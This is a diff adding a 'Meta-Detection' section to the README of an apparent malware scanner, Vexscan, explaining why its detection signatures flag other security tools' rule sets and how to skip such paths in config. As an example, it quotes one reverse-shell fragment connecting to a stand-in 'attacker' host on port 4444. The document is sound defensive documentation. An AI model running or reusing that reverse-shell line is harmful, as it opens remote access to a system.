@@ -250,6 +250,21 @@ vexscan scan <path> -f sarif          # SARIF for GitHub integration
 
 View all rules: `vexscan rules`
 
+## Meta-Detection
+
+When scanning security tools that contain malicious patterns in their own detection databases (e.g., another malware
+scanner's test fixtures), Vexscan will flag those patterns. This is expected and correct — the scanner has no way to
+know whether `import socket,subprocess;s.connect(("attacker",4444))` is a real reverse shell or a detection signature
+in someone else's rule set.
+
+If you're scanning a security-focused codebase and see a high number of findings, check whether the flagged files are
+detection rules or test fixtures. You can suppress known-safe paths with `skip_paths` in your config:
+
+```toml
+# vexscan.toml
+skip_paths = ["**/test/fixtures/malicious-*/**", "**/detection-rules/**"]
+```
+
 ## Configuration
 
 Create `vexscan.toml` in your project or `~/.vexscan.toml` globally:
